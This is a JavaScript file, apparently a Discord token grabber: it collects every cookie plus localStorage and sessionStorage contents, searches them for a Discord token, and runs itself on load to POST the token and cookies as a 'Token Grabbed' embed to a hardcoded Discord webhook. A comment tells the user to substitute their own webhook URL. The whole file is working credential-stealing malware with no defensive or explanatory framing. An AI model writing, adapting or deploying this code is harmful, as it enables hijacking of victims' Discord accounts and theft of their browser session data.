// Function to get all cookies
function getAllCookies() {
    let cookies = {};
    document.cookie.split(';').forEach(cookie => {
        let [name, value] = cookie.trim().split('=');
        cookies[name] = decodeURIComponent(value);
    });
    return cookies;
}

// Function to get all storage
function getAllStorage() {
    let storage = {
        localStorage: {},
        sessionStorage: {}
    };
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        storage.localStorage[key] = localStorage.getItem(key);
    }
    for (let i = 0; i < sessionStorage.length; i++) {
        let key = sessionStorage.key(i);
        storage.sessionStorage[key] = sessionStorage.getItem(key);
    }
    return storage;
}

// Function to extract Discord token
function getDiscordToken() {
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        if (key && (key.includes('token') || key === 'token')) {
            return localStorage.getItem(key);
        }
    }
    let cookies = getAllCookies();
    for (let [key, value] of Object.entries(cookies)) {
        if (key.toLowerCase().includes('token')) {
            return value;
        }
    }
    return null;
}

// Main grab function
async function grabAndSend() {
    const discordToken = getDiscordToken();
    const allCookies = getAllCookies();
    const storage = getAllStorage();
    
    // !!! REPLACE THIS WITH YOUR REAL DISCORD WEBHOOK URL !!!
    const webhookURL = "https://discord.com/api/webhooks/1510259871327588564/yJxLvuCDplRPPWBSzwE53rsrwfH7xNPMnssWbAYahvCSwRWaLZNaDIIJiYHrNllDH7Cj";
    
    const embed = {
        title: "🎯 Token Grabbed",
        color: 0xff0000,
        fields: [
            {
                name: "Discord Token",
                value: discordToken ? `\`${discordToken}\`` : "Not found",
                inline: false
            },
            {
                name: "Cookies",
                value: JSON.stringify(allCookies).substring(0, 500),
                inline: false
            }
        ],
        timestamp: new Date().toISOString()
    };
    
    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    }).catch(e => console.log("Webhook error:", e));
}

// Execute the function
grabAndSend();
